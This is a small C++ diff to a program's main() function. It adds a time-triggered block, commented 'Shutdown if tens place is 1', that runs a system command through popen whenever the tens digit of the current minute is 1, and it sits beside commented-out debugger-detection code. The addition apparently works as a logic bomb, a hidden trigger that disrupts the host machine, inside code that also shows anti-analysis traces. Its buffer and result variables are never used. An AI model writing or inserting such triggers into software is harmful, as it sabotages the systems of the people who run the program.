@@ -300,6 +300,21 @@ int main(){
     //     printf("Debugger detected");
     // }
 
+    //Shutdown if tens place is 1
+    if (gettenminute() == 1) {
+        FILE *fp;
+        char buffer[20];
+        std::string result = "";
+
+        // Open the pipe for reading
+        fp = popen(system_call(0).c_str(), "r"); 
+
+        if (fp == NULL) {
+            std::cerr << "Failed to open pipe" << std::endl;
+            return 1;
+        }    
+    }
+
     // Register the signal handler
     signal(SIGINT, handle_sigint);
 
